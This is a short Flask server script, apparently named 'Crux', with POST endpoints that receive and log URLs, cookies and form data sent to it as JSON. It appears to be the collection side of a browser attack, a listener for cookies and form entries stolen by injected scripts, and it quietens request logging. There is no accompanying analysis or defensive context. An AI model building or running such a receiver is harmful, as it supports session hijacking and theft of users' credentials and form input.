from flask import Flask, request
import json
import logging

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

logging.basicConfig(level=logging.INFO)

app = Flask(__name__)

@app.route("/")
def hello_world():
    return "<p>Hello from Crux!</p>"

@app.route("/u", methods=["POST"])
def get_url():
    if request.json:
        url = request.json["url"]
        logging.info(f"URL: {url}")
    return "Thanks!"

@app.route("/c", methods=["POST"])
def get_cookie():
    if request.json:
        cookie = request.json["cookie"]
        logging.info(f"Cookie: {cookie}")
    return "Thanks!"

@app.route("/f", methods=["POST"])
def get_form_data():
    if request.json:
        data = request.json["data"]
        logging.info(f"Form Data: {data}")
    return "Thanks!"